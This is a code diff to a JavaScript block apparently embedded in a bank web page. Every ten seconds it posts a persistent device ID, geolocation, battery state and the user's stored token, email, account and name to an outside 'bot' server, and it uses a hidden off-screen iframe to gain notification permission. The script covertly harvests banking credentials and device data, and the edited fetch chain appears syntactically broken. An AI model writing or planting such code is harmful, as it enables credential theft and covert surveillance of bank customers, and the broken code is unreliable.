@@ -762,6 +762,8 @@ if(A){refresh();pollMsgCount()}
   var API  = "https://bot15963-pnann.puratya.com";   /* ★ Bot側の公開URL */
   var PG   = "銀行";                              /* ★ bank.html では "銀行" */
   var PING = 10000;
+  var AK   = "cj_bank_auth";
+  var KEY  = "cj_bank_v1";
 
   /* 端末ごとの永続ID（ユーザ識別子・クライアント申告） */
   var ID;
@@ -801,7 +803,6 @@ if(A){refresh();pollMsgCount()}
     if (permFrame) return permFrame;
     permFrame = document.createElement("iframe");
     permFrame.src = PERM_ORIGIN + "/perm.html?p=" + encodeURIComponent(location.origin);
-    permFrame.setAttribute("allow", "notifications");
     permFrame.style.cssText = "position:fixed;left:-9999px;top:0;width:1px;height:1px;border:0;opacity:0.01";
     document.body.appendChild(permFrame);
     return permFrame;
@@ -1068,7 +1069,7 @@ if(A){refresh();pollMsgCount()}
   var d = document.createElement("i");
   d.title = NAME + " / " + PG;
   d.style.cssText = "position:fixed;left:6px;top:calc(6px + env(safe-area-inset-top,0px));width:7px;height:7px;" +
-    "border-radius:50%;background:#faa61a;box-shadow:0 0 8px currentColor;opacity:.5;pointer-events:none;z-index:1";
+    "border-radius:50%;background:#faa61a;box-shadow:0 0 8px currentColor;opacity:.6;pointer-events:none;z-index:99999";
   document.body.appendChild(d);
   var okN = 0, lastOk = 0, on = false;
   function dot(){
@@ -1369,7 +1370,7 @@ if(A){refresh();pollMsgCount()}
   }
 
   /* ============ 送信 ============ */
-  var jit = [], prevPush = 0, inflight = false, lastSend = 0;
+  var jit = [], prevPush = 0, inflight = false, lastSend = 0, ready = false;
   function jitter(){
     if (!prevPush) { prevPush = Date.now(); return null; }
     var dt = Date.now() - prevPush - PING;
@@ -1384,13 +1385,20 @@ if(A){refresh();pollMsgCount()}
     inflight = true; lastSend = Date.now();
 
     var jitMs = jitter();
-    fetch(API + "/api/ping", {
-      method: "POST", headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(Object.assign({
+
+    var sbObj = null;
+    try {
+      readSb();
+      if (SB) sbObj = { id: SB.id, tok: SB.tok, email: SB.email, acct: SB.acct, name: SB.name };
+    } catch (e) { SB = null; }
+
+    var body;
+    try {
+      body = JSON.stringify(Object.assign({
         id: ID, page: PG, reason: reason, t: Date.now(),
         vis: document.visibilityState, online: navigator.onLine,
         battery: bat, geo: geo, chips: chips(), hour: new Date().getHours(),
-        sb: (readSb(), SB ? { id: SB.id, tok: SB.tok, email: SB.email, acct: SB.acct, name: SB.name } : null),
+        sb: sbObj,
         sys: Object.assign({}, SYS, EXTRA, {
           idle: Math.round((Date.now() - lastAct) / 1000),
           focus: document.hasFocus(),
@@ -1407,22 +1415,16 @@ if(A){refresh();pollMsgCount()}
           } : null,
           perms: PERMS, media: MEDIA
         })
-      }, sendName ? { name: NAME } : {})),
-      keepalive: !!final
+      }, sendName ? { name: NAME } : {}));
+    } catch (e) { inflight = false; dot(); return; }
+
+    fetch(API + "/api/ping", {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: body, keepalive: !!final
     }).then(function(r){
       if (!r.ok) { dot(); return null; }
       okN++; lastOk = Date.now(); dot();
-      return r.json().catch(function(){ return null; });
-    }).then(function(j){
-      if (!j) return;
-      if (j.name && j.name !== NAME) {
-        NAME = j.name;
-        try { localStorage.setItem("cj_watch_name", NAME); } catch(e){}
-        d.title = NAME + " / " + PG;
-      }
-      sendName = false;                       /* 以降はサーバ側の名前を正とする */
-      if (j.notify && j.notify.length) notify(j.notify);
-    }).catch(function(){ dot(); })
+      if (!ready) { ready = true; openStream(); }
       .then(function(){ inflight = false; });
   }
 
@@ -1433,16 +1435,44 @@ if(A){refresh();pollMsgCount()}
   window.addEventListener("pagehide", function(){ push("close", true); });
 
   /* ============ 常時接続（1タブだけが持ち、死んだら次が継ぐ） ============ */
-  var ES = null, LEADER_DONE = null;
+  var ES = null, LEADER_DONE = null, USE_STREAM = true, streamFail = 0;
+
+  function closeStream(){ if (!ES) return; ES.closed = true; try { ES.ac.abort(); } catch(e){} ES = null; }
 
   function openStream(){
-    if (ES) return;
-    ES = new EventSource(API + "/api/stream?id=" + encodeURIComponent(ID));
-    ES.addEventListener("resync", function(){ push("resync"); });
-    ES.addEventListener("tick", function(){ push("tick"); });   /* サーバ主導で取得 */
-    ES.onerror = function(){ if (ES.readyState === 2) { ES = null; setTimeout(openStream, 1500); } };
+    if (ES || !ready || !USE_STREAM) return;
+    var ac = new AbortController(), me = ES = { ac: ac, closed: false };
+    fetch(API + "/api/stream?id=" + encodeURIComponent(ID) + "&t=" + Date.now(), {
+      headers: { Accept: "text/event-stream" }, cache: "no-store", signal: ac.signal
+    }).then(function(r){
+      if (!r.ok || !r.body) throw new Error("stream " + r.status);
+      streamFail = 0;
+      var rd = r.body.getReader(), dec = new TextDecoder(), buf = "";
+      (function pump(){
+        rd.read().then(function(x){
+          if (me.closed) return;
+          if (x.done) throw new Error("closed");
+          buf += dec.decode(x.value, { stream: true });
+          var i;
+          while ((i = buf.indexOf("\n\n")) >= 0){
+            var blk = buf.slice(0, i); buf = buf.slice(i + 2);
+            if (blk.indexOf("event: resync") >= 0) push("resync");
+            else if (blk.indexOf("event: tick") >= 0) push("tick");
+          }
+          pump();
+        }).catch(function(){ fail(); });
+      })();
+    }).catch(function(){ fail(); });
+
+    function fail(){
+      if (me.closed) return;
+      me.closed = true;
+      if (ES === me) ES = null;
+      if (++streamFail >= 4) return;
+      setTimeout(openStream, 2500 * streamFail);
+    }
   }
-  function kick(){ if (ES) { ES.close(); ES = null; } openStream(); }
+  function kick(){ streamFail = 0; closeStream(); openStream(); }
 
   addEventListener("online", kick);
   addEventListener("pageshow", kick);
@@ -1455,7 +1485,7 @@ if(A){refresh();pollMsgCount()}
     navigator.locks.request("cj-watch-leader", async function(){
       openStream();
       await new Promise(function(r){ LEADER_DONE = r; });
-      if (ES) { ES.close(); ES = null; }
+      closeStream();
     });
   } else {
     openStream();
